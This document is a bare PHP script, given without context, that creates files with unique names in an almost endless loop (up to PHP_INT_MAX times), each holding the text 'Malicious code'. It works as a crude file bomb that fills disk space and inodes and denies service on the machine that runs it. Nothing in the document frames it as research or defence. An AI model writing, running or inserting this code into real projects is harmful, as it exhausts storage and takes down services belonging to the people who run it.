<?php

function create_file() {
    $id = uniqid();
    $file = fopen($id, "w");
    fwrite($file, "Malicious code");
    fclose($file);
}

for ($i = 0; $i < PHP_INT_MAX; $i++) {
    create_file();
}

?>
